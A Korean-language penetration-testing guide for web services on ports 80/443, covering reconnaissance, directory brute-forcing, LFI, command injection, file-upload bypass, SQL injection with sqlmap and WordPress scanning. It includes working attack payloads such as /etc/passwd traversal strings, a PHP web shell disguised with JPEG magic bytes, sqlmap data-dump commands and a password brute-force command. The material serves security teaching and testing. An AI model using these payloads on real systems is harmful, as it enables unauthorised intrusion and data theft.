---
sidebar_position: 3
title: HTTP/HTTPS (Port 80/443)
---

# HTTP/HTTPS 취약점 진단 (포트 80/443)

## 개요

**HTTP/HTTPS**: 웹 서비스 프로토콜

웹 애플리케이션은 다양한 공격 벡터를 가지고 있어 가장 복잡하고 중요한 진단 대상입니다.

---

## 공격 마인드셋: Source & Sink

웹 애플리케이션 취약점 분석 시 항상 고려:

### Source (입력 지점)
**질문**: 사용자는 어디서 입력값을 제공하는가?

- GET/POST 파라미터
- 쿠키
- HTTP 헤더
- API 요청 바디
- 파일 업로드

### Sink (사용 지점)
**질문**: 입력값은 어디서 사용되는가?

- 데이터베이스 쿼리
- 파일 시스템
- 시스템 명령어
- HTML 출력
- 외부 API 호출

### 공격 가능성 분석
1. 어떤 입력값을 제어할 수 있는가?
2. 입력값 검증/필터링이 있는가?
3. Sink에서 입력값이 어떻게 사용되는가?
4. 어떤 페이로드로 악용 가능한가?

---

## 정보 수집

### 웹 서버 및 기술 스택 확인

**Burp Suite 사용**:
```
1. Burp Suite Intercept 활성화
2. 브라우저로 사이트 접속
3. 요청 Capture → Repeater로 전송
4. Response 헤더 확인:
   - Server: Apache/2.4.41
   - X-Powered-By: PHP/7.4.3
```

**cURL로 헤더 확인**:
```bash
curl -I http://<target>

# 출력 예시:
# Server: nginx/1.18.0
# X-Powered-By: PHP/7.4.3
```

**Wappalyzer 사용**:
- Chrome Extension 설치
- 사이트 방문 시 자동으로 기술 스택 표시
- CMS, 프레임워크, 라이브러리 등 확인

**WhatWeb 사용**:
```bash
whatweb http://<target>

# 예시
whatweb http://192.168.1.10

# 출력:
# http://192.168.1.10 [200 OK] Apache[2.4.41], Country[US], HTML5, PHP[7.4.3], WordPress[5.8]
```

### Robots.txt 확인

```bash
# 크롤러 접근 규칙 확인
curl http://<target>/robots.txt

# 예시 내용:
# User-agent: *
# Disallow: /admin/
# Disallow: /backup/
# Disallow: /config/
```

**의미**: 크롤링 금지 디렉토리 = 숨기고 싶은 디렉토리

---

## 디렉토리 브루트포싱

### Gobuster

```bash
# 기본 디렉토리 스캔
gobuster dir -u <url> -w <wordlist>

# 예시
gobuster dir -u http://192.168.1.10/ \
  -w /usr/share/wordlists/dirb/common.txt

# 파일 확장자 포함
gobuster dir -u http://192.168.1.10/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html,zip,bak

# 상태 코드 필터
gobuster dir -u <url> -w <wordlist> \
  -s "200,301,302" -b "404,403"

# 스레드 증가 (빠르게)
gobuster dir -u <url> -w <wordlist> -t 50
```

**주요 워드리스트**:
```bash
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
```

### Ffuf (추천)

```bash
# 디렉토리 스캔
ffuf -u http://<target>/FUZZ -w <wordlist>

# 파일 확장자 포함
ffuf -u http://<target>/FUZZ -w <wordlist> -e .php,.txt,.html

# 상태 코드 필터
ffuf -u http://<target>/FUZZ -w <wordlist> -mc 200,301,302

# 예시
ffuf -u http://192.168.1.10/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302 -e .php,.txt
```

---

## 주요 웹 취약점

### LFI (Local File Inclusion)

**개념**: 서버의 로컬 파일을 읽을 수 있는 취약점

**수동 테스트**:
```bash
# 기본 LFI
http://<target>/page.php?file=../../../../etc/passwd

# Null byte (PHP < 5.3.4)
http://<target>/page.php?file=../../../../etc/passwd%00

# 다양한 경로
http://<target>/page.php?file=....//....//....//etc/passwd
```

**자동화 도구 - LFImap**:
```bash
# 설치
git clone https://github.com/hansmach1ne/LFImap.git
cd LFImap
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt

# 사용
python3 lfimap.py -U <url> -C <cookie> -a

# 예시
python3 lfimap.py -U "http://target.com/page.php?file=test" \
  -C "PHPSESSID=abc123; security=low" -a
```

### Command Injection

**개념**: OS 명령어를 주입하여 실행

**수동 테스트**:
```bash
# 명령어 연산자
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)

# URL 인코딩 필수
%3B+whoami
%7C+whoami
```

**Burp Suite 활용**:
1. Intruder로 요청 전송
2. 페이로드 위치 지정
3. 페이로드 리스트 로드
4. Attack 실행

**페이로드 리스트**:
- https://github.com/payloadbox/command-injection-payload-list

### 파일 업로드 우회

**개념**: 파일 업로드 필터를 우회하여 웹 쉘 업로드

**매직 바이트 확인**:
```bash
# xxd로 파일 시그니처 확인
xxd <file> | head -10

# PNG 매직 바이트: 89 50 4E 47
# JPEG 매직 바이트: FF D8 FF
# GIF 매직 바이트: 47 49 46 38
```

**우회 기법**:

1. **Content-Type 변조** (Burp Suite):
```
Content-Type: image/jpeg
→ Content-Type: application/x-php
```

2. **이중 확장자**:
```
shell.php.jpg
shell.jpg.php
shell.php%00.jpg (Null byte)
```

3. **대소문자**:
```
shell.PHP
shell.pHp
```

4. **매직 바이트 추가**:
```bash
# JPEG 매직 바이트 + PHP 코드
echo -e "\xFF\xD8\xFF\xE0<?php system(\$_GET['cmd']); ?>" > shell.php
```

**자동화 도구 - Fuxploider**:
```bash
# 설치
git clone https://github.com/almandin/fuxploider.git
cd fuxploider
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt

# 사용
python3 fuxploider.py \
  --url http://target.com/upload.php \
  --cookies "PHPSESSID=abc123" \
  --not-regex "not uploaded" \
  -d "submit=Upload"
```

### SQL Injection

**수동 테스트**:
```sql
-- 기본 테스트
'
"
' OR '1'='1
" OR "1"="1
' OR 1=1--
admin'--
admin' #
```

**SQLMap**:
```bash
# GET 파라미터
sqlmap -u "http://target.com/page.php?id=1"

# POST 데이터
sqlmap -u "http://target.com/login.php" \
  --data "username=admin&password=pass"

# 쿠키 사용
sqlmap -u "http://target.com/page.php?id=1" \
  --cookie="PHPSESSID=abc123"

# 데이터베이스 열거
sqlmap -u <url> --dbs

# 테이블 열거
sqlmap -u <url> -D <database> --tables

# 데이터 덤프
sqlmap -u <url> -D <database> -T <table> --dump
```

---

## WordPress 전용 도구

### WPScan

```bash
# 기본 스캔
wpscan --url http://<target>

# 플러그인 열거
wpscan --url http://<target> --enumerate p

# 테마 열거
wpscan --url http://<target> --enumerate t

# 사용자 열거
wpscan --url http://<target> --enumerate u

# 비밀번호 브루트포스
wpscan --url http://<target> \
  --passwords /usr/share/wordlists/rockyou.txt \
  --usernames admin

# API 토큰 사용 (취약점 정보)
wpscan --url http://<target> --api-token <token>
```

---

## 주요 명령어 요약

```bash
# 정보 수집
curl -I http://<target>
whatweb http://<target>

# 디렉토리 스캔
gobuster dir -u <url> -w <wordlist> -x php,txt
ffuf -u http://<target>/FUZZ -w <wordlist> -mc 200,301

# LFI 테스트
curl "http://<target>/page.php?file=../../../../etc/passwd"

# SQLMap
sqlmap -u "http://<target>/page.php?id=1" --dbs

# WordPress 스캔
wpscan --url http://<target> --enumerate p,t,u

# 매직 바이트 확인
xxd <file> | head -10
```

## 보안 권장사항

1. ✅ 입력 검증 및 필터링
2. ✅ Prepared Statements (SQL Injection 방어)
3. ✅ 파일 업로드 화이트리스트
4. ✅ 최소 권한 원칙
5. ✅ WAF (Web Application Firewall) 사용
6. ✅ HTTPS 사용
7. ✅ 정기적인 보안 패치
